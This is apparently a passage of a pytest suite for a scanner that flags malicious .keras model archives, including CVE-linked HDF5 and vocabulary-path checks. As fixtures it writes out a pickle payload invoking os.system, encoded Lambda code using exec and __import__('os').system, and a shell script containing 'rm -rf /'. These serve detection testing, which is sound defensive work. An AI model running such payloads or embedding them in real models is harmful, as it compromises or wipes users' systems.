"""
Test the Keras ZIP scanner for detecting malicious Lambda layers in .keras files.

The new .keras format is a ZIP archive containing:
- config.json: Model configuration with layer definitions
- metadata.json: Model metadata
- model.weights.h5: Model weights in HDF5 format
"""

import base64
import json
import os
import tempfile
import zipfile
from pathlib import Path
from typing import Any

import pytest

from modelaudit.scanners import keras_zip_scanner as keras_zip_scanner_module
from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.keras_zip_scanner import KerasZipScanner

try:
    import h5py
except ImportError:  # pragma: no cover - optional dependency in some environments
    h5py = None


def create_configured_keras_zip(
    tmp_path: Path,
    config: dict[str, Any],
    *,
    keras_version: str = "3.13.2",
    file_name: str = "model.keras",
    weights_h5_path: Path | None = None,
) -> Path:
    """Create a configurable .keras archive for regression tests."""
    keras_path = tmp_path / file_name
    with zipfile.ZipFile(keras_path, "w") as zf:
        zf.writestr("config.json", json.dumps(config))
        zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
        if weights_h5_path is not None:
            zf.write(weights_h5_path, "model.weights.h5")
    return keras_path


def create_external_link_weights_h5(tmp_path: Path) -> Path:
    """Create a weights H5 file containing an ExternalLink to a local fixture."""
    if h5py is None:
        pytest.skip("h5py not available")

    external_source = tmp_path / "external_source.h5"
    with h5py.File(external_source, "w") as f:
        f.create_dataset("payload", data=[1.0, 2.0])

    weights_path = tmp_path / "model.weights.h5"
    with h5py.File(weights_path, "w") as f:
        f["linked_kernel"] = h5py.ExternalLink(external_source.name, "/payload")

    return weights_path


def create_regular_weights_h5(tmp_path: Path) -> Path:
    """Create a benign embedded weights H5 file."""
    if h5py is None:
        pytest.skip("h5py not available")

    weights_path = tmp_path / "model.weights.h5"
    with h5py.File(weights_path, "w") as f:
        f.create_dataset("kernel", data=[1.0, 2.0])
    return weights_path


class TestKerasZipScanner:
    """Test the Keras ZIP scanner functionality."""

    def test_scanner_available(self):
        """Test that the scanner is available."""
        scanner = KerasZipScanner()
        assert scanner is not None
        assert scanner.name == "keras_zip"

    def test_detects_cve_2026_1669_in_embedded_weights(self, tmp_path: Path) -> None:
        """Vulnerable .keras archives should warn on embedded HDF5 ExternalLink weights."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert cve_issues[0].details["keras_version"] == "3.12.0"
        assert cve_issues[0].details["external_references"] == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/linked_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_embedded_hdf5_external_references_are_not_warnings_on_fixed_version(self, tmp_path: Path) -> None:
        """Fixed Keras versions should not fail for embedded external references."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.1",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
        assert any(
            check.name == "HDF5 External Weight Reference Version Check" and check.status == CheckStatus.PASSED
            for check in result.checks
        )

    def test_benign_embedded_weights_do_not_emit_warning_noise(self, tmp_path: Path) -> None:
        """Benign embedded weights should not produce warning or critical noise."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.13.2",
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_embedded_weights_size_limit_prevents_unbounded_extraction(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Oversized embedded weights should be skipped before extraction to a temp file."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", True)

        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_weights.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        limit_checks = [check for check in result.checks if check.name == "Embedded Weights Size Limit"]
        assert len(limit_checks) == 1
        assert limit_checks[0].status == CheckStatus.FAILED
        assert limit_checks[0].details["uncompressed_size"] == 4096
        assert limit_checks[0].details["max_embedded_weights_bytes"] == 1024
        assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)

    @pytest.mark.parametrize(
        "scanner_config",
        [
            {"max_embedded_weights_bytes": "1024"},
            {"max_embedded_weights_bytes": None},
            {"max_embedded_weights_bytes": True},
            {"max_file_read_size": "2048"},
        ],
    )
    def test_invalid_embedded_weight_limit_config_uses_default(
        self,
        tmp_path: Path,
        scanner_config: dict[str, Any],
    ) -> None:
        """Invalid size-limit config values should not crash scans or force bogus 1-byte limits."""
        scanner = KerasZipScanner(scanner_config)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.13.2",
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert scanner.max_embedded_weights_bytes == KerasZipScanner.MAX_EMBEDDED_WEIGHTS_BYTES
        assert result.success
        assert all(check.name != "Embedded Weights Size Limit" for check in result.checks)
        assert not any(check.name == "Keras ZIP File Scan" for check in result.checks)

    def test_can_handle_keras_zip(self, tmp_path: Path) -> None:
        """Test that scanner can identify ZIP-based .keras files."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {"class_name": "Sequential", "config": {"layers": []}}
            zf.writestr("config.json", json.dumps(config))
            metadata = {"keras_version": "3.0.0"}
            zf.writestr("metadata.json", json.dumps(metadata))

        assert scanner.can_handle(str(keras_path))

    def test_can_handle_keras_zip_with_only_config_json(self, tmp_path: Path) -> None:
        """A real .keras suffix should still route to the Keras scanner with only config.json."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "config_only.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {"class_name": "Sequential", "config": {"layers": []}}
            zf.writestr("config.json", json.dumps(config))

        assert scanner.can_handle(str(keras_path))

    def test_scan_normalized_config_member_and_recurses_embedded_pickle(self, tmp_path: Path) -> None:
        """Normalized ./config.json members should still receive Keras and recursive ZIP scans."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "normalized_config.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {"class_name": "InputLayer", "name": "input_1", "config": {}},
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    },
                ]
            },
        }
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps(config))
            zf.writestr("./metadata.json", json.dumps({"keras_version": "3.0.0"}))
            zf.writestr("./payload.pkl", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        assert result.metadata.get("keras_version") == "3.0.0"
        assert any("lambda" in issue.message.lower() for issue in result.issues)
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "./payload.pkl"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    def test_scan_normalized_weights_member_checks_embedded_hdf5_external_references(self, tmp_path: Path) -> None:
        """Normalized ./model.weights.h5 members should still receive Keras-specific HDF5 checks."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "normalized_weights.keras"
        weights_path = create_external_link_weights_h5(tmp_path)
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("./metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.write(weights_path, "./model.weights.h5")

        result = scanner.scan(str(keras_path))

        assert result.metadata.get("keras_version") == "3.12.0"
        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].location is not None
        assert cve_issues[0].location.startswith(f"{keras_path}:")
        assert cve_issues[0].location.rsplit(":", 1)[-1].removeprefix("./") == "model.weights.h5"
        assert cve_issues[0].details["keras_version"] == "3.12.0"
        assert cve_issues[0].details["external_references"] == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/linked_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_scan_prefers_exact_config_json_over_normalized_alias(self, tmp_path: Path) -> None:
        """A canonical config.json member should win over normalized aliases regardless of archive order."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "duplicate_root.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        benign_config = {"class_name": "Sequential", "config": {"layers": []}}
        malicious_config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    }
                ]
            },
        }

        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps(benign_config))
            zf.writestr("config.json", json.dumps(malicious_config))

        result = scanner.scan(str(keras_path))

        assert result.success is True
        assert any("lambda" in issue.message.lower() for issue in result.issues)
        assert not any(check.name == "Keras ZIP Member Path Validation" for check in result.checks)

    def test_scan_fails_closed_on_ambiguous_normalized_config_aliases(self, tmp_path: Path) -> None:
        """Multiple non-canonical aliases for config.json should fail closed instead of depending on ZIP order."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "ambiguous_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("/config.json", json.dumps({"class_name": "Functional", "config": {"layers": []}}))

        result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert ambiguity_checks[0].details["member_name"] == "config.json"
        assert sorted(ambiguity_checks[0].details["candidate_filenames"]) == ["./config.json", "/config.json"]
        assert result.success is False

    def test_scan_bounds_recursive_member_rescans_with_embedded_weight_limit(self, tmp_path: Path) -> None:
        """Recursive fallback scans should not extract oversized non-Keras members with unbounded ZIP defaults."""
        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_payload.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("payload.pkl", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        recursive_size_checks = [
            check
            for check in result.checks
            if check.name == "ZIP Entry Scan" and check.details.get("entry") == "payload.pkl"
        ]
        assert len(recursive_size_checks) == 1
        assert recursive_size_checks[0].status == CheckStatus.FAILED
        assert "exceeds maximum size of 1024 bytes" in recursive_size_checks[0].message
        assert result.success is True
        assert result.has_warnings is True

    def test_scan_fails_closed_on_oversized_config_json_and_recurses_payloads(self, tmp_path: Path) -> None:
        """Oversized config.json members should be bounded before parsing and still recurse other entries."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "oversized_config.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            config = {
                "class_name": "Sequential",
                "config": {"layers": []},
                "padding": "A" * (11 * 1024 * 1024),
            }
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("payload.pkl", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        config_checks = [check for check in result.checks if check.name == "Config JSON Parsing"]
        assert len(config_checks) == 1
        assert config_checks[0].status == CheckStatus.FAILED
        assert "ZIP member exceeds bounded read size" in config_checks[0].message
        assert config_checks[0].details["max_config_bytes"] == 10 * 1024 * 1024
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "payload.pkl"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )
        assert result.success is False

    def test_scan_skips_oversized_metadata_json_without_warning_noise(self, tmp_path: Path) -> None:
        """Oversized optional metadata.json should be bounded and ignored without adding noisy findings."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "oversized_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                json.dumps({"keras_version": "3.0.0", "padding": "A" * (11 * 1024 * 1024)}),
            )

        result = scanner.scan(str(keras_path))

        assert result.success is True
        assert result.metadata.get("model_class") == "Sequential"
        assert "keras_version" not in result.metadata
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_lambda_layer_with_exec(self):
        """Test detection of Lambda layer with exec() call."""
        scanner = KerasZipScanner()

        # Create malicious Lambda layer config
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()

        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "function": [encoded_code, None, None],
                            "function_type": "lambda",
                        },
                    },
                ]
            },
        }

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", json.dumps(config))
                zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Should detect Lambda layer with exec
            assert len(result.issues) > 0, "Should detect Lambda layer with dangerous code"

            # Check for critical issue
            critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            assert len(critical_issues) > 0, "Lambda with exec should be CRITICAL"

            # Check that exec was detected
            exec_found = False
            for issue in result.issues:
                if "exec" in issue.message.lower() and "lambda" in issue.message.lower():
                    exec_found = True
                    assert "lambda_1" in issue.message or "lambda_1" in str(issue.details)
                    break

            assert exec_found, "Should detect exec in Lambda layer"

        finally:
            os.unlink(temp_path)

    def test_multiple_dangerous_patterns(self):
        """Test detection of multiple dangerous patterns in Lambda layers."""
        scanner = KerasZipScanner()

        # Create Lambda with multiple dangerous patterns
        dangerous_code = """
import os
import subprocess
eval("os.system('cmd')")
subprocess.call(['ls'])
__import__('pickle').loads(data)
"""
        encoded_code = base64.b64encode(dangerous_code.encode()).decode()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "dangerous_lambda",
                        "config": {
                            "function": [encoded_code, None, None],
                        },
                    }
                ]
            },
        }

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", json.dumps(config))
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Should detect dangerous patterns
            assert len(result.issues) > 0, "Should detect dangerous patterns"

            # Check that multiple patterns were detected
            all_messages = " ".join(issue.message for issue in result.issues)
            patterns_detected = []
            for pattern in ["eval", "subprocess", "__import__", "pickle"]:
                if pattern in all_messages.lower():
                    patterns_detected.append(pattern)

            assert len(patterns_detected) > 0, f"Should detect dangerous patterns, found: {patterns_detected}"

        finally:
            os.unlink(temp_path)

    def test_safe_lambda_layer(self):
        """Test that safe Lambda layers are handled appropriately."""
        scanner = KerasZipScanner()

        # Create a Lambda with safe code
        safe_code = "lambda x: x * 2"
        encoded_code = base64.b64encode(safe_code.encode()).decode()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "safe_lambda",
                        "config": {
                            "function": [encoded_code, None, None],
                        },
                    }
                ]
            },
        }

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", json.dumps(config))
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Safe Lambda should not be CRITICAL
            critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            assert len(critical_issues) == 0, "Safe Lambda should not be CRITICAL"

        finally:
            os.unlink(temp_path)

    def test_stringlookup_external_vocabulary_path_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """Absolute StringLookup vocabulary paths should be attributed to CVE-2025-12058 on vulnerable Keras."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "leaked-vocab.txt"
        external_vocab_path.write_text("secret-token\n", encoding="utf-8")

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.WARNING
        assert cve_checks[0].details["layer_name"] == "string_lookup"
        assert cve_checks[0].details["cwe"] == "CWE-502, CWE-918"

    def test_stringlookup_remote_vocabulary_url_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """Remote StringLookup vocabulary URLs should also be attributed to CVE-2025-12058."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "https://example.com/vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert any(check.details.get("cve_id") == "CVE-2025-12058" for check in result.checks)

    def test_stringlookup_inline_vocabulary_list_stays_clean(self, tmp_path: Path) -> None:
        """Inline StringLookup vocabularies are benign and should not emit warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": ["red", "green", "blue"]},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert all(check.details.get("cve_id") != "CVE-2025-12058" for check in result.checks)
        noisy_issues = [
            issue for issue in result.issues if issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL)
        ]
        assert noisy_issues == []

    def test_stringlookup_external_vocabulary_path_is_passing_on_fixed_keras(self, tmp_path: Path) -> None:
        """Fixed-version metadata from the archive is inconclusive, but should not emit warning noise."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "vocab.txt"
        external_vocab_path.write_text("token\n", encoding="utf-8")
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.12.0")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].name == "StringLookup External Vocabulary Metadata Check"
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.INFO
        assert "metadata-only assessment is inconclusive" in cve_checks[0].message
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_stringlookup_windows_home_relative_path_is_detected(self, tmp_path: Path) -> None:
        """Windows-style home-relative vocabulary paths should be normalized and detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "~\\vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert any(
            check.details.get("cve_id") == "CVE-2025-12058" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_stringlookup_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """Prereleases of the fixed Keras version are still vulnerable."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "vocab.txt"
        external_vocab_path.write_text("token\n", encoding="utf-8")
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        for keras_version in ("3.12.0a0", "3.12.0rc1", "3.12.0.dev0"):
            model_path = create_configured_keras_zip(tmp_path, config, keras_version=keras_version)
            result = scanner.scan(str(model_path))

            cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
            assert len(cve_checks) == 1
            assert cve_checks[0].status == CheckStatus.FAILED
            assert cve_checks[0].severity == IssueSeverity.WARNING

    def test_custom_registered_objects(self):
        """Test detection of custom registered objects."""
        scanner = KerasZipScanner()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "registered_name": "custom_package.CustomDense",
                        "config": {},
                    }
                ]
            },
        }

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", json.dumps(config))
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Should detect custom registered object
            custom_found = False
            for check in result.checks:
                if "custom" in check.message.lower() and "registered" in check.message.lower():
                    custom_found = True
                    break

            assert custom_found, "Should detect custom registered objects"

        finally:
            os.unlink(temp_path)

    def test_executable_files_in_zip(self):
        """Test detection of executable files in the ZIP archive."""
        scanner = KerasZipScanner()

        config = {"class_name": "Sequential", "config": {"layers": []}}

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", json.dumps(config))
                # Add suspicious files
                zf.writestr("malicious.py", "import os; os.system('cmd')")
                zf.writestr("script.sh", "#!/bin/bash\nrm -rf /")

            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Should detect Python and shell scripts
            suspicious_files = []
            for check in result.checks:
                if "Python file" in check.message or "Executable file" in check.message:
                    suspicious_files.append(check.message)

            assert len(suspicious_files) >= 2, f"Should detect suspicious files, found: {suspicious_files}"

        finally:
            os.unlink(temp_path)

    def test_case_insensitive_suspicious_extension_detection(self):
        """Uppercase/mixed-case executable extensions should be detected."""
        scanner = KerasZipScanner()

        config = {"class_name": "Sequential", "config": {"layers": []}}

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", json.dumps(config))
                zf.writestr("MALWARE.PY", "print('evil')")
                zf.writestr("run.SH", "#!/bin/bash\necho evil")
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)
            suspicious_files = [
                check.message
                for check in result.checks
                if "Python file found in Keras ZIP" in check.message
                or "Executable file found in Keras ZIP" in check.message
            ]
            assert len(suspicious_files) >= 2, f"Should detect uppercase suspicious files, found: {suspicious_files}"

        finally:
            os.unlink(temp_path)

    def test_nested_models(self):
        """Test scanning of nested model structures."""
        scanner = KerasZipScanner()

        # Create nested model with Lambda in submodel
        malicious_code = '__import__("os").system("cmd")'
        encoded_code = base64.b64encode(malicious_code.encode()).decode()

        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "Lambda",
                                    "name": "nested_lambda",
                                    "config": {
                                        "function": [encoded_code, None, None],
                                    },
                                }
                            ]
                        },
                    }
                ]
            },
        }

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", json.dumps(config))
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Should detect Lambda in nested model
            assert len(result.issues) > 0, "Should detect Lambda in nested model"

            # Check that __import__ was detected
            import_found = False
            for issue in result.issues:
                if "__import__" in issue.message.lower():
                    import_found = True
                    break

            assert import_found, "Should detect __import__ in nested Lambda"

        finally:
            os.unlink(temp_path)

    def test_invalid_json_config(self):
        """Test handling of invalid JSON in config."""
        scanner = KerasZipScanner()

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                zf.writestr("config.json", "{ invalid json }")
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Should handle invalid JSON gracefully
            assert not result.success
            json_error_found = False
            for check in result.checks:
                if "parse" in check.message.lower() and "json" in check.message.lower():
                    json_error_found = True
                    break

            assert json_error_found, "Should report JSON parsing error"

        finally:
            os.unlink(temp_path)

    def test_missing_config_json(self):
        """Test handling of .keras file without config.json."""
        scanner = KerasZipScanner()

        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
            with zipfile.ZipFile(f, "w") as zf:
                # Only add metadata, no config
                zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
            temp_path = f.name

        try:
            result = scanner.scan(temp_path)

            # Should handle missing config.json
            missing_config_found = False
            for check in result.checks:
                if "config.json" in check.message:
                    missing_config_found = True
                    break

            assert missing_config_found, "Should report missing config.json"

        finally:
            os.unlink(temp_path)

    def test_detects_subclassed_model_in_zip(self, tmp_path):
        """Test that scanner detects subclassed models with custom class names."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "model.keras"

        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {
                "class_name": "MyCustomTransformer",  # Subclassed model
                "config": {
                    "name": "custom_transformer",
                    "layers": [
                        {"class_name": "Dense", "config": {"units": 10}},
                    ],
                },
            }
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

        result = scanner.scan(str(keras_path))

        from modelaudit.scanners.base import CheckStatus

        subclass_checks = [c for c in result.checks if "subclassed" in c.name.lower()]
        assert len(subclass_checks) > 0
        assert subclass_checks[0].status != CheckStatus.PASSED
        assert subclass_checks[0].severity == IssueSeverity.INFO

    def test_compile_config_detects_custom_layer_loss_and_metric(self, tmp_path: Path) -> None:
        """ZIP scanner should inspect compile_config and custom layer classes."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "MaliciousLayer",
                        "name": "malicious_layer",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": "malicious_loss",
                "metrics": [{"class_name": "MaliciousMetric", "config": {"name": "malicious_metric"}}],
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="custom_objects.keras")))

        custom_layer_checks = [check for check in result.checks if check.name == "Custom Layer Class Detection"]
        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert any(check.details.get("layer_class") == "MaliciousLayer" for check in custom_layer_checks)
        assert any(check.details.get("identifier") == "MaliciousMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "malicious_loss" for check in custom_loss_checks)

    def test_compile_config_detects_nested_metric_and_loss_mappings(self, tmp_path: Path) -> None:
        """Nested compile_config structures should not bypass custom-object detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": "malicious_loss"},
                "metrics": [["accuracy", {"class_name": "MaliciousMetric", "config": {"name": "metric"}}]],
                "weighted_metrics": {"output_1": ["Precision", "WeightedBackdoorMetric"]},
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="nested_compile.keras")))

        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert any(check.details.get("identifier") == "MaliciousMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "WeightedBackdoorMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "malicious_loss" for check in custom_loss_checks)

    def test_compile_config_safe_aliases_and_builtin_layers_do_not_false_positive(self, tmp_path: Path) -> None:
        """Safe aliases and built-in preprocessing layers should remain clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
